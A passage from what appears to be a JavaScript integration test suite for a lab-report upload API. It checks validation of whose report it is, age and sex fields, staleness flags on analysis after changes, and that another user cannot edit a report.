      const alice = await makeUser('subject.blank@example.com');
      const res = await uploadAs(alice.token, { subjectOwner: 'other' });
      expect(res.status).toBe(201);
      expect(res.body.data.report.subject).toEqual({ owner: 'other' });
    });

    it("refuses an age or sex on the owner's own report -- the profile holds those", async () => {
      const alice = await makeUser('subject.selfage@example.com');
      const res = await uploadAs(alice.token, { subjectOwner: 'self', subjectAge: '34' });
      expect(res.status).toBe(422);
    });

    it.each([['200'], ['-1'], ['3.5'], ['abc']])('refuses an age of %s', async (age) => {
      const alice = await makeUser(`subject.badage.${age}@example.com`);
      const res = await uploadAs(alice.token, { subjectOwner: 'other', subjectAge: age });
      expect(res.status).toBe(422);
    });

    it('refuses a sex outside the listed options', async () => {
      const alice = await makeUser('subject.badsex@example.com');
      const res = await uploadAs(alice.token, { subjectOwner: 'other', subjectSex: 'unicorn' });
      expect(res.status).toBe(422);
    });

    it('changes whose report it is later, and back', async () => {
      const alice = await makeUser('subject.patch@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      const id = body.data.report.id;

      const toOther = await patchSubject(alice.token, id, { subjectOwner: 'other', subjectAge: 63, subjectSex: 'male' });
      expect(toOther.status).toBe(200);
      expect(toOther.body.data.report.subject).toEqual({ owner: 'other', age: 63, sex: 'male' });

      const back = await patchSubject(alice.token, id, { subjectOwner: 'self' });
      expect(back.status).toBe(200);
      expect(back.body.data.report.subject).toEqual({ owner: 'self' });
    });

    it('says the analysis is out of date after a change', async () => {
      const alice = await makeUser('subject.stale@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      const id = body.data.report.id;
      await Report.updateOne({ _id: id }, { $set: { 'analysis.completedAt': new Date(Date.now() - 60_000), 'analysis.version': 1 } });

      const res = await patchSubject(alice.token, id, { subjectOwner: 'other' });
      expect(res.body.data.report.subjectChangedSinceAnalysis).toBe(true);
    });

    it('says the analysis is out of date after a change made WHILE it was running', async () => {
      const alice = await makeUser('subject.midrun@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      const id = body.data.report.id;
      await Report.updateOne({ _id: id }, {
        $set: {
          'analysis.startedAt': new Date(Date.now() - 60_000),
          'analysis.completedAt': new Date(Date.now() + 60_000),
          'analysis.version': 1,
        },
      });

      const res = await patchSubject(alice.token, id, { subjectOwner: 'other' });
      expect(res.body.data.report.subjectChangedSinceAnalysis).toBe(true);
    });

    it('does not ask for a re-analysis when the change came before the run began', async () => {
      const alice = await makeUser('subject.beforerun@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      const id = body.data.report.id;
      await patchSubject(alice.token, id, { subjectOwner: 'other' });
      await Report.updateOne({ _id: id }, {
        $set: {
          'analysis.startedAt': new Date(Date.now() + 1_000),
          'analysis.completedAt': new Date(Date.now() + 90_000),
          'analysis.version': 1,
        },
      });

      const res = await request(app).get(`${REPORTS}/${id}`).set(auth(alice.token));
      expect(res.status).toBe(200);
      expect(res.body.data.report.subjectChangedSinceAnalysis).toBe(false);
    });

    it("another user cannot change it -- the same 404 as a missing report", async () => {
      const alice = await makeUser('subject.owner@example.com');
      const bob = await makeUser('subject.intruder@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');

      const res = await patchSubject(bob.token, body.data.report.id, { subjectOwner: 'other' });
      expect(res.status).toBe(404);
      expect((await Report.findById(body.data.report.id)).subject.owner).toBe('self');
    });

    it('requires an answer', async () => {
      const alice = await makeUser('subject.required@example.com');
      const { body } = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      expect((await patchSubject(alice.token, body.data.report.id, {})).status).toBe(422);
    });
  });
});
